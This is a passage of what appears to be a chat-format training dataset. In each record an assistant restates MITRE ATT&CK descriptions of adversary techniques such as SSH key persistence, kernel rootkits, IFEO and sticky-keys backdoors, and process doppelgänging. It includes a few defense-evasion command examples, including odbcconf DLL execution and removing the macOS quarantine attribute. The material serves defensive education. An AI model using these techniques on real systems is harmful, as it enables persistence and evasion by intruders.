[Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.(Citation: Brining MimiKatz to Unix)Note: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache). The systems targeted by this attack pattern are: Windows, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SSH Authorized Keys' and with the Id: T1098.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SSH Authorized Keys' and with the Id: T1098.004 is described as follows: Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code>.(Citation: SSH Authorized Keys) Users may edit the system\u2019s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value \u201cyes\u201d to ensure public key and RSA authentication are enabled. The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.Adversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI\u2019s \u201cadd-metadata\u201d command an adversary may add SSH keys to a user account.(Citation: Google Cloud Add Metadata)(Citation: Google Cloud Privilege Escalation) Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.(Citation: Azure Update Virtual Machines) This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm) It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.Where authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. SSH keys can also be added to accounts on network devices, such as with the `ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) command.(Citation: cisco_ip_ssh_pubkey_ch_cmd). The systems targeted by this attack pattern are: Linux, macOS, IaaS, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Kernel Modules and Extensions' and with the Id: T1215 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Kernel Modules and Extensions' and with the Id: T1215 is described as follows: Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)Kernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir). The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Security Support Provider' and with the Id: T1101 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Security Support Provider' and with the Id: T1101 is described as follows: Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called. (Citation: Graeber 2014). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Security Appliances' and with the Id: T1590.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Security Appliances' and with the Id: T1590.006 is described as follows: Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).(Citation: Nmap Firewalls NIDS) Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Image File Execution Options Injection' and with the Id: T1546.012 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Image File Execution Options Injection' and with the Id: T1546.012 is described as follows: Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)Similar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the \"debugger\" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.Malware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Odbcconf' and with the Id: T1218.008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Odbcconf' and with the Id: T1218.008 is described as follows: Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft.Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017) . The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Search Engines' and with the Id: T1593.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Search Engines' and with the Id: T1593.002 is described as follows: Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)Adversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'LSASS Driver' and with the Id: T1177 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'LSASS Driver' and with the Id: T1177 is described as follows: The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation: Microsoft Security Subsystem)Adversaries may target lsass.exe drivers to obtain execution and/or persistence. By either replacing or adding illegitimate drivers (e.g., [DLL Side-Loading](https://attack.mitre.org/techniques/T1073) or [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038)), an adversary can achieve arbitrary code execution triggered by continuous LSA operations.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Business Relationships' and with the Id: T1591.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Business Relationships' and with the Id: T1591.002 is described as follows: Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization\u2019s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim\u2019s hardware and software resources.Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Temporary Elevated Cloud Access' and with the Id: T1548.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Temporary Elevated Cloud Access' and with the Id: T1548.005 is described as follows: Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. Just-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.(Citation: Azure Just in Time Access 2023)Account impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts.(Citation: Google Cloud Service Account Authentication Roles)(Citation: Hunters Domain Wide Delegation Google Workspace 2023)(Citation: Google Cloud Just in Time Access 2023)(Citation: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.(Citation: Microsoft Impersonation and EWS in Exchange) Many cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.(Citation: AWS PassRole)(Citation: Google Cloud Service Account Authentication Roles)While users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.(Citation: Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS Privilege Escalation)**Note:** this technique is distinct from [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.(Citation: CrowdStrike StellarParticle January 2022). The systems targeted by this attack pattern are: IaaS, Azure AD, Office 365, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Video Capture' and with the Id: T1125 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Video Capture' and with the Id: T1125 is described as follows: An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review). The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Gatekeeper Bypass' and with the Id: T1144 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Gatekeeper Bypass' and with the Id: T1144 is described as follows: In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called <code>com.apple.quarantine</code>. This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. Apps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won\u2019t set this flag. Additionally, other utilities or events like drive-by downloads don\u2019t necessarily set it either. This completely bypasses the built-in Gatekeeper check. (Citation: Methods of Mac Malware Persistence) The presence of the quarantine flag can be checked by the xattr command <code>xattr /path/to/MyApp.app</code> for <code>com.apple.quarantine</code>. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, <code>sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app</code>. (Citation: Clearing quarantine attribute) (Citation: OceanLotus for OS X) In typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS\u2019s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application. (Citation: Bypassing Gatekeeper). The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Software Packing' and with the Id: T1045 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Software Packing' and with the Id: T1045 is described as follows: Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.Adversaries may use virtual machine software protection as a form of software packing to protect their code. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018). The systems targeted by this attack pattern are: Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Process Doppelg\u00e4nging' and with the Id: T1055.013 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Process Doppelg\u00e4nging' and with the Id: T1055.013 is described as follows: Adversaries may inject malicious code into process via process doppelg\u00e4nging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelg\u00e4nging is a method of executing arbitrary code in the address space of a separate live process. Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)Adversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelg\u00e4nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelg\u00e4nging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)Process Doppelg\u00e4nging is implemented in 4 steps (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017):* Transact \u2013 Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.* Load \u2013 Create a shared section of memory and load the malicious executable.* Rollback \u2013 Undo changes to original executable, effectively removing malicious code from the file system.* Animate \u2013 Create a process from the tainted section of memory and initiate execution.This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelg\u00e4nging may evade detection from security products since the execution is masked under a legitimate process. . The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Network Configuration Discovery' and with the Id: T1016 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Network Configuration Discovery' and with the Id: T1016 is described as follows: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion )Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. . The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Delete Cloud Instance' and with the Id: T1578.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Delete Cloud Instance' and with the Id: T1578.003 is described as follows: An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.An adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and later terminate the instance after achieving their objectives.(Citation: Mandiant M-Trends 2020). The systems targeted by this attack pattern are: IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Code Repositories' and with the Id: T1593.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Code Repositories' and with the Id: T1593.003 is described as follows: Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.  Adversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys.(Citation: GitHub Cloud Service Credentials) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)). **Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1213/003), which focuses on [Collection](https://attack.mitre.org/tactics/TA0009) from private and internally hosted code repositories. . The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Executable Installer File Permissions Weakness' and with the Id: T1574.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Executable Installer File Permissions Weakness' and with the Id: T1574.005 is described as follows: Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Accessibility Features' and with the Id: T1546.008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Accessibility Features' and with the Id: T1546.008 is described as follows: Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.Two common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'PowerShell Profile' and with the Id: T1504 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'PowerShell Profile' and with the Id: T1504 is described as follows: Adversaries may gain persistence and elevate privileges in certain situations by abusing [PowerShell](https://attack.mitre.org/techniques/T1086) profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments. PowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles). The systems targeted by this attack pattern are: Windows ."}]}
